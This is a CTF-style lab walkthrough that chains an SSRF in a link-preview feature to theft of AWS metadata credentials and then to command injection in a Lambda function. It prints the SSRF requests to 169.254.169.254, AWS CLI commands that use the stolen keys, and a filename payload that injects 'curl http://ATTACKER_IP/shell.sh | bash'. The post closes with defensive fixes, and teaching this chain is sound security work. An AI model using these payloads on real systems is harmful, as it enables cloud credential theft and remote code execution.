Chaining SSRF with AWS Instance Metadata to Achieve Remote Code Execution

A walkthrough of a HackTheBox machine where a seemingly low-severity server-side request forgery turned into a full remote shell — by pivoting through a cloud metadata endpoint most developers forget exists.

Published June 10, 2026 Reading time 12 min Author Wil

Starting point: a "low severity" bug

This box looked unremarkable at first glance. A standard web application with a feature that let users preview an external link before sharing it — paste a URL, the server fetches it, and a thumbnail or summary gets generated. On paper, this is a server-side request forgery waiting to happen. In practice, plenty of teams ship this exact pattern and treat the resulting SSRF as low risk because "what's the worst that could happen, it just fetches a webpage."

That assumption falls apart fast once the server fetching the request happens to be running inside a cloud environment.

Recon and finding the SSRF

The link preview feature accepted a URL parameter and returned the page title and a short description. The first thing worth testing on any feature like this is whether the server will fetch internal, non-public addresses:

POST /api/preview Content-Type: application/json {"url": "http://127.0.0.1:80"}

The response came back with a title and description — meaning the server happily fetched a local address and returned its content. That confirmed the SSRF. The next question was what else was reachable from inside that network that the application's authors had not considered.

Why internal fetches matter A server sitting inside a cloud VPC often has network access to services that are never meant to be internet-facing — internal APIs, admin panels, and crucially, the cloud provider's own metadata service. SSRF turns the vulnerable server into a proxy for reaching all of it.

Pivoting to the metadata endpoint

Most major cloud providers expose an instance metadata service at a well-known internal IP address, used by the instance itself to retrieve configuration data — including, in many setups, temporary IAM credentials. For AWS, that address is:

# AWS instance metadata service 169.254.169.254

Pointing the vulnerable preview feature at this address was the obvious next step:

POST /api/preview Content-Type: application/json {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

The response returned a role name. Requesting that role's full path returned temporary AWS access keys directly in the preview output:

{ "title": "", "description": "{\n \"AccessKeyId\": \"ASIA...\",\n \"SecretAccessKey\": \"...\",\n \"Token\": \"...\",\n \"Expiration\": \"2026-06-10T18:22:14Z\"\n}" }

At this point, the SSRF had escalated from "the server can read internal webpages" to "I now hold valid, if temporary, AWS credentials for the role this instance is running as."

From credentials to a shell

With the stolen credentials loaded locally, the next step was figuring out what the role could actually do:

# Configure the AWS CLI with the stolen temporary credentials aws configure set aws_access_key_id ASIA... aws configure set aws_secret_access_key ... aws configure set aws_session_token ... # Enumerate permissions attached to the role aws sts get-caller-identity aws iam list-attached-role-policies --role-name preview-service-role

The role had permissions to read from an S3 bucket and, more importantly, to invoke a Lambda function used internally for processing uploaded files. The Lambda function accepted a payload and wrote output to the same S3 bucket — and critically, it executed shell commands as part of a file conversion step without properly sanitising the filename parameter.

Tip from practice Stolen cloud credentials are rarely the end goal — they are a pivot point. Always enumerate what the role can actually do before assuming the engagement has reached its ceiling. A role with no useful permissions is a dead end; a role that can invoke other internal services usually is not.

By uploading a crafted filename containing a command injection payload and invoking the Lambda function directly using the stolen credentials, it was possible to achieve command execution inside the Lambda's runtime environment, which had a network path back to the original target host.

# Simplified payload used to trigger command injection aws lambda invoke --function-name file-convert \ --payload '{"filename": "img.jpg; curl http://ATTACKER_IP/shell.sh | bash"}' \ output.json

That reverse shell connection back to a listener completed the chain — from a link preview field, to internal credentials, to remote code execution.

Why this chain matters

Individually, each step in this chain looks survivable. An SSRF into internal-only services is bad but often dismissed as low impact. Slightly over-permissioned IAM roles are extremely common in real environments. A file-processing Lambda with weak input sanitisation happens constantly. None of these issues alone necessarily gets flagged as critical.

Chained together, they form a complete path from an unauthenticated input field to remote code execution. This is the core lesson of most serious real-world breaches — they are rarely a single catastrophic bug, but a sequence of "acceptable" weaknesses that compound.

How this gets fixed

A few independent controls would have broken this chain at different points:

  • Block internal IP ranges in the SSRF-prone feature. URL fetchers should explicitly deny requests to private IP ranges, link-local addresses (including 169.254.169.254), and localhost.
  • Enforce IMDSv2 on the instance. AWS's newer metadata service version requires a session token obtained via a PUT request, which most basic SSRF payloads cannot perform — this alone would have stopped the credential theft here.
  • Apply least privilege to the IAM role. A role attached to a link-preview service has no legitimate reason to invoke an unrelated Lambda function.
  • Sanitise all inputs passed into shell commands, regardless of how deep in the call chain they sit — the filename parameter should never have reached a shell unsanitised in the first place.

Takeaway

SSRF is consistently underrated because the immediate impact — "the server fetched a URL" — sounds harmless on its own. The real risk only becomes visible once you start asking what else the vulnerable server can reach, and cloud metadata endpoints are one of the highest-value targets to check first. If you are practising SSRF on labs or CTFs, make checking for metadata service access a habit every single time.
